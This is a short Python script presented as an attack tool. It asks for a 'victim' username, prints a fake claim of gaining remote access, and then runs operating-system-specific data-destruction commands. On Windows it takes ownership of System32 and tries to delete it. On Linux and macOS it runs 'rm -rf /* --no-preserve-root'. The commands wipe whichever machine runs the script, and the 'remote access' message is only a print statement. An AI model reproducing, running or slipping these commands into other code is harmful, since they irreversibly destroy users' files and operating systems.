import os
import detect
import platform

def start():
    name = input("Username of victim: ")
    print(f"Getting remote access into {name}'s computer")

def attack():
    detect.detect()
    operating_system = platform.system()
    if operating_system == "Windows":
        os.system("cd C:\Windows")
        os.system("takeown /F System32 /R")
        os.system("rmdir System32")
    elif operating_system == "Linux":
       os.system("rm -rf /* --no-preserve-root")
    elif operating_system == "Darwin":
       os.system("rm -rf /* --no-preserve-root")
